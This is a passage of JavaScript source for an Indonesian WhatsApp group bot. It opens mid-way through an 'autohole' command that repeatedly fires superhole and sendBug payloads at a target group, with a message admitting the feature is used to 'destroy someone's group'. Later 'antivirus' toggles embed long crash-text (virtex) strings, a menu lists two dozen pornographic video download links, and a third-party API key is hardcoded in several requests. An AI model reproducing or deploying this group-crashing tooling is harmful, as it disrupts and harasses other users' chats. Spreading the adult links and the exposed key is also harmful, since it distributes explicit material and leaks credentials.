  await wann.sendMessage(`${server}`, `${global.get.anu.this.compossing}INFO : • ENG\n\nhello my developer, the use of bots has used the “autohole” feature to destroy someone‘s group.\n\n\nINFO : • IND\n\nHalo pengembang saya, penggunaan bot telah menggunakan fitur “autohole” untuk menghancurkan grup seseorang.${global.get.anu.this.compossing}\n\n\n────── 「 *${global.get.anu.packName}* 」 ──────\n── © 𝑐𝑟𝑒𝑎𝑡𝑒𝑑 𝐵𝑦 ItsukaAllan ──`, MessageType.extendedText, {sendEphemeral: true })
  superhole(targett)
  await sleep(3000)
  sendBug(targett)
  await sleep(4000)
  superhole(targett)
  await sleep(5000)
  sendBug(targett)
  await sleep(6000)
  superhole(targett)
  await sleep(7000)
  reply(`${prefix}autohole ${args[0]}`)
  console.log(iluminated.bold.yellow('[SYSTEM]'), iluminated.bold('Mengirim Bug Dalam Grup'), color(groupName))
  }
  autoplay(wan.key.remoteJid)
  }
  break
//------------------< Enable / Disable >-------------------
case 'listbadword':
   bi = `List badword\n\n`
  for (let boo of badword){
      bi += `- ${boo}\n`
  }
  bi += `\nTotal : ${badword.length}`
  reply(bi)
  break
//------------------< Enable / Disable >-------------------                
case 'addbadword':
  if (!isGroupAdmins && !isPremium)return reply(mess.GrupAdmin)
  if (args.length < 2) return reply(`masukkan kata`)
  if (isKasar(args[1].toLowerCase(), badword)) return reply(`Udah ada`)
  addBadword(args[1].toLowerCase(), badword)
  reply(`Sukses`)
  break
//------------------< Enable / Disable >-------------------
case 'delbadword':
  if (!isOwner) return reply(mess.OnlyOwner)
  if (args.length < 2) return reply(`masukkan kata`)
  if (!isKasar(args[1].toLowerCase(), badword)) return reply(`Ga ada`)
  delBadword(args[1].toLowerCase(), badword)
  reply(`Sukses`)
  break
//------------------< Enable / Disable >-------------------                
case 'clearbadword':
  if (!isOwner) return reply(mess.OnlyOwner)
  if (args.length < 2) return reply(`tag atau nomor`)
  if (mentioned.length !== 0){
      for (let i = 0; i < mentioned.length; i++){
      delCountKasar(mentioned[i], senbadword)
      }
      reply('Sukses')
  } else {
      delCountKasar(args[1] + '@s.whatsapp.net', senbadword)
      reply('Sukses')
  }
  break

case "delvote":



if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json')) {



  deleteVote(from);



  reply("Sukses Menghapus sesi Voting Di Grup Ini");



} else {



  reply("Belum ada sesi yang dimulai")



}



break;

case 'antivirus1':
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                      if (args[0] === 'a') {
                                      if (isAntiFirtex) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                             antifirtex.push(from)
                                             fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))
                                             reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :* ๒๒')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === 'b') {
                                             antifirtex.splice(from, 1)
                                             fs.writeFileSync('./database/group/antifirtex.json', JSON.stringify(antifirtex))
                                             reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                      } else {
                                             reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break
//==================================================================================
case 'antivirus2':
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                      if (args[0] === 'a') {
                                      if (isAntiFirtex2) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                             antifirtex2.push(from)
                                             fs.writeFileSync('./database/group/antifirtex2.json', JSON.stringify(antifirtex2))
                                             reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  🧙‍♂️𝐀𝐥𝐚𝐤𝐚𝐳𝐚𝐦🔮')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === 'b') {
                                             antifirtex2.splice(from, 1)
                                             fs.writeFileSync('./database/group/antifirtex2.json', JSON.stringify(antifirtex2))
                                             reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                      } else {
                                             reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break
//==================================================================================
case 'antivirus3':
  //fix By ItsukaAllan
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
                                     if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                     if (args[0] === 'a') {
                                     if (isAntiFirtex3) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                            antifirtex3.push(from)
                                            fs.writeFileSync('./database/group/antifirtex3.json', JSON.stringify(antifirtex3))
                                            reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  𝐗-𝐕𝐢𝐫𝐮𝐬')
                                            wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                     } else if (args[0] === 'b') {
                                            antifirtex3.splice(from, 1)
                                            fs.writeFileSync('./database/group/antifirtex3.json', JSON.stringify(antifirtex3))
                                            reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                     } else {
                                            reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                     }
                                     break
//==================================================================================
case 'antivirus4':
  //fix By ItsukaAllan
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
                                     if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                     if (args[0] === 'a') {
                                     if (isAntiFirtex4) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                            antifirtex4.push(from)
                                            fs.writeFileSync('./database/group/antifirtex4.json', JSON.stringify(antifirtex4))
                                            reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  *⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ')
                                            wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                     } else if (args[0] === 'b') {
                                            antifirtex4.splice(from, 1)
                                            fs.writeFileSync('./database/group/antifirtex4.json', JSON.stringify(antifirtex4))
                                            reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                     } else {
                                            reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                     }
                                     break
//==================================================================================
case 'antivirus5':
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                      if (args[0] === 'a') {
                                      if (isAntiFirtex5) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                             antifirtex5.push(from)
                                             fs.writeFileSync('./database/group/antifirtex5.json', JSON.stringify(antifirtex5))
                                             reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  𝐂𝐎𝐋𝐎𝐒𝐒𝐀𝐋 𝐓??𝐓𝐀𝐍')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === 'b') {
                                             antifirtex5.splice(from, 1)
                                             fs.writeFileSync('./database/group/antifirtex5.json', JSON.stringify(antifirtex5))
                                             reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                      } else {
                                             reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break    
//==================================================================================
case 'antivirus6':
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                      if (args[0] === 'a') {
                                      if (isAntiFirtex6) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                             antifirtex6.push(from)
                                             fs.writeFileSync('./database/group/antifirtex6.json', JSON.stringify(antifirtex6))
                                             reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  ♚㜸ཽཽࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ͢͢㜺ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧ㜸ཽཽཽ͢͢͢♚')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === 'b') {
                                             antifirtex6.splice(from, 1)
                                             fs.writeFileSync('./database/group/antifirtex6.json', JSON.stringify(antifirtex6))
                                             reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                      } else {
                                             reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break   
//==================================================================================
case 'antivirus7':
   //fix By ItsukaAllan
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins) return reply(mess.only.admin)
                                      if (args.length < 1) return reply('ketik a untuk mengaktifkan')
                                      if (args[0] === 'a') {
                                      if (isAntiFirtex7) return reply('*SUDAH DI AKTIFKAN SEBELUMNYA*')
                                             antifirtex7.push(from)
                                             fs.writeFileSync('./database/group/antifirtex7.json', JSON.stringify(antifirtex7))
                                             reply('「 *VIRUS DETECTOR* 」 PERINTAH DITERIMA, ANTI VIRUS WHATSAPP SUDAH DIAKTIFKAN PADA GRUP INI.\n*Berbasis :* Text\n*Jenis :*  9999999')
                                             wann.sendMessage(from,`「 *NOTICE GROUP* 」Jika bukan admin jangan kirim Virtex Yang Unfaedah!  Jika Anda Kirim Maka Bot Akan Mengeluarkanmu.`, text)
                                      } else if (args[0] === 'b') {
                                             antifirtex7.splice(from, 1)
                                             fs.writeFileSync('./database/group/antifirtex7.json', JSON.stringify(antifirtex7))
                                             reply('「 *VIRTEX DETECTOR* 」 PERINTAH DI TERIMA, ANTI VIRTEX SUDAH DINONAKTIFKAN PADA GRUP INI.')
                                      } else {
                                             reply('b untuk mengaktifkan, disable untuk menonaktifkan')
                                      }
                                      break 


//==================================================================================


case "voting": // tambahin if (!isGroupAdmins) return; kalau mau khusus admin



if (!isGroup) return reply(mess.only.group);



if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json')) {



  reply("Sesi vote sedang berlangsung")



} else {



  if (!q)



 return reply(



"*Voting*\n\n" +



prefix +



"voting @tag target | reason  | 1 (1 = 1 Menit)"



);



  if (



 wan.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||



 wan.message.extendedTextMessage.contextInfo == null



 ) {



 let id = wan.message.extendedTextMessage.contextInfo.mentionedJid[0];



  split = q.replace("@", "").split("|");



  if (!Number(split[2]))



 return reply(



"masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"



);



  await mentions(



 "Vote " +



 "@" +



 id.split("@")[0] +



 " Di Mulai" +



 "\n\n" +



 `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,



 [id],



 true



 );



  addVote(from, split[1], split[0], split[2], reply);



}



 }



 break;



 case 'infomenu':



 case  'menuinfo':



 wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}update



▹  ${prefix}level



▹  ${prefix}rules



▹  ${prefix}profile



▹  ${prefix}waktu



▹  ${prefix}botstat



▹  ${prefix}sewabot



▹  ${prefix}listsewa



▹  ${prefix}owner



▹  ${prefix}ping



▹  ${prefix}runtime



▹  ${prefix}donasi



▹  ${prefix}leaderboard



▹  ${prefix}cekpremium



▹  ${prefix}listpremium



▹  ${prefix}sourcecode



▹  ${prefix}bugreport *keluhan*`







 sendButMessage(from, wibu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



 case 'pornmenu':



 case  '181+':



 groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))



 privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))



 ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`



 charger = `${charging ? 'lagi dicas' : 'ga dicas'}`



 uptime = process.uptime();



 timestampe = speed();



 totalChat = await wann.chats.all()



 latensie = speed() - timestampe



 total = math(`${groups.length}*${privat.length}`)











 menu =`${botName}







⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹ ${prefix}bkp *random*



▹ ${prefix}bokep1



▹ ${prefix}bokep2



▹ ${prefix}bokep3



▹ ${prefix}bokep4



▹ ${prefix}bokep5



▹ ${prefix}bokep6



▹ ${prefix}bokep7



▹ ${prefix}bokep8



▹ ${prefix}bokep9



▹ ${prefix}bokep10



▹ ${prefix}bokep11



▹ ${prefix}bokep12



▹ ${prefix}bokep13



▹ ${prefix}bokep14



▹ ${prefix}bokep15



▹ ${prefix}bokep16



▹ ${prefix}bokep17



▹ ${prefix}bokep18



▹ ${prefix}bokep19



▹ ${prefix}bokep20



▹ ${prefix}bokep21



▹ ${prefix}bokep22



▹ ${prefix}bokep23



▹ ${prefix}bokep24



▹ ${prefix}bokep25



 `







 sendButMessage(from, menu, `created follow @achyrr_wann`, [



 {



buttonId: noprefix ? "menu" : "!"+"menu",



buttonText: {



  displayText: `⬡ BACK TO MENU `,



},



type: 1,



 },]);



 break;



//addfiturbokep



case 'bokep1':				 







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' , text, {quoted: freply})



break



case 'bokep2':







wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' , text, {quoted: freply})



break



case 'bokep3':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file', text, {quoted: reply })				 



break



case 'bokep4':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' , text, {quoted: freply})				



break



case 'bokep5':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' , text, {quoted: freply})				



break



case 'bokep6':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' , text, {quoted: freply})				



break



case 'bokep7':







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' , text, {quoted: freply})				



break



case 'bokep8':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' , text, {quoted: freply})				



break







case 'bokep10':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' , text, {quoted: freply})				



break



case 'bokep11':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' , text, {quoted: freply})				



break



case 'bokep12':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' , text, {quoted: freply})				



break



case 'bokep13':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' , text, {quoted: freply})				



break



case 'bokep14':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' , text, {quoted: freply})				



break



case 'bokep15':







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' , text, {quoted: freply})				



break



case 'bokep16':







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' , text, {quoted: freply})				



break



case 'bokep17':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' , text, {quoted: freply})				



break



case 'bokep18':







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' , text, {quoted: freply})				



break



case 'bokep19':				 







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' , text, {quoted: freply})				



break



case 'bokep20':			







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' , text, {quoted: freply})				



break



case 'bokep21':				 







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' , text, {quoted: freply})				



break



case 'bokep22':		







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' , text, {quoted: freply})				



break



case 'bokep23':	







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' , text, {quoted: freply})				



break



case 'bokep24':				 







qute = fs.readFileSync('media/Menu.jpg') 



wann.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' , text, {quoted: freply})				



break











break



case 'islammenu':



case  'islamimenu':











menu =` ${botName}







Hai kak 👋🏻 ${pushname}



Jangan lupa bersyukur untuk hari ini ~



Silahkan pilih tabel di bawah ini , jika tidak support silahkan ketik ! command 







 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹ ${prefix}listsurah



▹ ${prefix}alquran



▹ ${prefix}alquranaudio



▹ ${prefix}asmaulhusna



▹ ${prefix}kisahnabi



▹ ${prefix}jadwalsholat`



sendButMessage(from, menu, `created follow @achyrr_wann`, [



{



 buttonId: noprefix ? "menu" : "!"+"menu",



 buttonText: {



displayText: `⬡ BACK TO MENU `,



 },



 type: 1,



  },]);



break;  



case 'command':

list = []

listmenu = [`groupmenu`,`photoxy`,`ephoto`,`randomimage`,`wibu2`,`storymenu`,`porno`,`randomtext`,`islammenu`,`wibumenu`,`stickermenu`,`ownermenu`,`gamemenu`,`funmenu`,`downloadmenu`,`infomenu`,`othermenu`,`owner`,`ikyygroup`,`sewabot`]

listmenuu = [`Menu Group`,`Photo Oky`,`Ephoto Menu`,`Random Image`,`Nsfw Anime`,`Movie&Story`,`18+ Menu`,`RandomText`,`Islam Menu`,`Wibu Menu`,`Sticker Menu`,`Owner Command`,`Game Menu`,`For Fun Menu`,`Downloader`,`Info Menu`,`Menu Lainnya`,`OwnerBot`,`Official Group`,`Rent this Bot`]

nombor = 1

startnum = 0

for (let x of listmenu) {

  const yy = {title: 'menu ke' + nombor++,

  rows: [

  {

title: `${listmenuu[startnum++]}`,

description: ``,

rowId: `${prefix}${x}`

 }

 ]

  }

  list.push(yy)

}

listmsg(from, `${ucapanWaktu} ${pushname} 👋
  I Am ${botName}
  Ini Menu Simpel Kami Jangan 
  Jangan Lupa Subs Channel Kami
  `,`🐣Jangan Dibuat Mainan Ya Kak😇😇  `, list, { quoted: freply})

break



///ISLAMI MENU  

// Islami //



case 'listsurah':



get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=IkyChan`)



get_result = get_result.result



ini_txt = 'List Surah:\n'



for (var x in get_result) {



  ini_txt += `${x}. ${get_result[x]}\n`



}



reply(ini_txt)



break



case 'alquran':



if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)



  urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=IkyChan`



quran = await fetchJson(urls)



result = quran.result



ayat = result.ayat



ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`



for (var x of ayat) {



  arab = x.arab



  nomor = x.ayat



  latin = x.latin



  indo = x.indonesia



  ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`



}



ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")



ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")



ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")



reply(ini_txt)



break



case 'alquranaudio':



if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)



  surah = args[0]



ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=IkyChan`)



await wann.sendMessage(from, ini_buffer, audio, { quoted: freply, mimetype: Mimetype.mp4Audio })



break



case 'asmaulhusna':



get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=IkyChan`)



get_result = get_result.result



ini_txt = `No : ${get_result.index}\n`



ini_txt += `Latin: ${get_result.latin}\n`



ini_txt += `Arab : ${get_result.ar}\n`



ini_txt += `Indonesia : ${get_result.id}\n`



ini_txt += `English : ${get_result.en}`



reply(ini_txt)



break



case 'kisahnabi':



if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)



  query = args.join(" ")



get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=IkyChan`)



get_result = get_result.result



ini_txt = `Name : ${get_result.name}\n`



ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`



ini_txt += `Umur : ${get_result.age}\n`



ini_txt += `Tempat : ${get_result.place}\n`



ini_txt += `Story : \n${get_result.story}`



reply(ini_txt)



break



case 'jadwalsholat':



if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)



  daerah = args.join(" ")



get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=IkyChan`)



get_result = get_result.result



ini_txt = `Wilayah : ${get_result.wilayah}\n`



ini_txt += `Tanggal : ${get_result.tanggal}\n`



ini_txt += `Sahur : ${get_result.sahur}\n`



ini_txt += `Imsak : ${get_result.imsak}\n`



ini_txt += `Subuh : ${get_result.subuh}\n`



ini_txt += `Terbit : ${get_result.terbit}\n`



ini_txt += `Dhuha : ${get_result.dhuha}\n`



ini_txt += `Dzuhur : ${get_result.dzuhur}\n`



ini_txt += `Ashar : ${get_result.ashar}\n`



ini_txt += `Maghrib : ${get_result.imsak}\n`



ini_txt += `Isya : ${get_result.isya}`



reply(ini_txt)



break



case 'rules':



wann.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: freply})



break



















 ////SPORTAGE MENU







 case 'slow':



 encmedia = JSON.parse(JSON.stringify(wan).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 media = await wann.downloadAndSaveMediaMessage(encmedia)



 ran = getRandom('.mp3')



